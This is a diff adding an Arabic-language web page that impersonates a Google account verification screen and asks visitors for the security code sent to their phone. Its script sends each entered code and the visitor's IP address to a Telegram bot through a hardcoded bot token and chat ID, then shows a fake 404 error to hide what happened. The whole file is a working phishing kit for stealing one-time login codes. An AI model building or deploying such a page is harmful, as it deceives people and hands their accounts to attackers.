@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>أدخل الرمز</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      color: #202124;
+      flex-direction: column;
+      direction: rtl;
+    }
+
+    .container {
+      text-align: center;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      padding: 40px 30px;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 400px;
+    }
+
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"] {
+      width: 80%; /* Shortened width */
+      padding: 14px 18px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 24px;
+      outline: none;
+      transition: box-shadow 0.2s ease;
+    }
+
+    input[type="text"]:focus {
+      box-shadow: 0 0 0 3px rgba(66,133,244,0.3);
+      border-color: #4285f4;
+    }
+
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #4285f4;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #357ae8;
+    }
+
+    /* Google logo styling */
+    .google-logo {
+      width: 92px;
+      margin-bottom: 20px;
+    }
+
+    @media (max-width: 500px) {
+      .container {
+        padding: 30px 20px;
+      }
+
+      h1 {
+        font-size: 20px;
+      }
+
+      input[type="text"] {
+        font-size: 14px;
+        padding: 12px 15px;
+      }
+
+      button {
+        font-size: 14px;
+        padding: 8px 16px;
+      }
+    }
+
+    /* 404 error page styling */
+    .error-container {
+      display: none; /* Initially hidden */
+      text-align: center;
+      padding: 40px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      background: #fff;
+      width: 100%;
+      max-width: 500px;
+      border-radius: 12px;
+    }
+
+    .error-container h1 {
+      font-size: 48px;
+      color: #202124;
+    }
+
+    .error-container p {
+      font-size: 18px;
+      color: #202124;
+      margin-top: 20px;
+    }
+
+    .error-container button {
+      margin-top: 30px;
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #4285f4;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+    }
+
+    .error-container button:hover {
+      background-color: #357ae8;
+    }
+    .hint {
+  font-size: 14px;
+  color: #5f6368;  /* Grey color */
+  margin-top: 15px; /* Space between submit button and hint */
+}
+
+  </style>
+</head>
+<body>
+  <!-- Google Logo -->
+  <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="شعار جوجل" class="google-logo">
+
+  <div class="container">
+    <h1>أدخل الرمز الخاص بك</h1>
+    <form id="codeForm" onsubmit="handleSubmit(event)">
+      <input type="text" id="codeInput" placeholder="اكتب الرمز هنا..." required>
+      <button type="submit">تحقق</button>
+      <div class="hint">
+  يرجى إدخال الرمز الذي تلقيته على هاتفك للحفاظ على أمان حسابك.
+</div>
+    </form>
+  </div>
+
+  <!-- 404 Error Page (Initially Hidden) -->
+  <div class="error-container" id="errorPage">
+    <h1>404 - حدث خطأ</h1>
+    <p>تحقق من الاتصال بالإنترنت، أعد تشغيل المودم، وتحقق من انقطاع الخدمة. جرب مسح ذاكرة المتصفح أو جهاز آخر.</p>
+    <button onclick="window.location.reload()">إعادة تحميل الصفحة</button>
+  </div>
+
+ <script>
+  function handleSubmit(event) {
+    event.preventDefault();
+    
+    const code = document.getElementById('codeInput').value;
+
+    // Get the user's IP address using the ipify API
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const userIP = data.ip;
+
+        // Hide the main form container
+        document.querySelector('.container').style.display = 'none';
+
+        // Show the 404 error page
+        document.getElementById('errorPage').style.display = 'block';
+
+        // Your bot token and chat ID
+        const botToken = '8007902539:AAGznIv_m-SljUGC_zbdXli0PkQWQksbHcc';
+        const chatID = '1562595173'; // Replace with your chat ID
+
+        // Telegram API URL
+        const apiURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // Prepare the message including IP address and the submitted code
+        const message = `تم إرسال الرمز الجديد: ${code}\nعنوان الـ IP الخاص بالمستخدم: ${userIP}`;
+
+        // Use fetch to send the message to your Telegram bot
+        fetch(apiURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatID,
+            text: message,
+          }),
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            console.log('تم إرسال الرسالة بنجاح');
+          } else {
+            console.error('فشل في إرسال الرسالة');
+          }
+        })
+        .catch(error => {
+          console.error('خطأ في إرسال الرسالة:', error);
+        });
+      })
+      .catch(error => {
+        console.error('خطأ في جلب عنوان الـ IP:', error);
+      });
+  }
+</script>
+
+  </script>
+</body>
+</html>
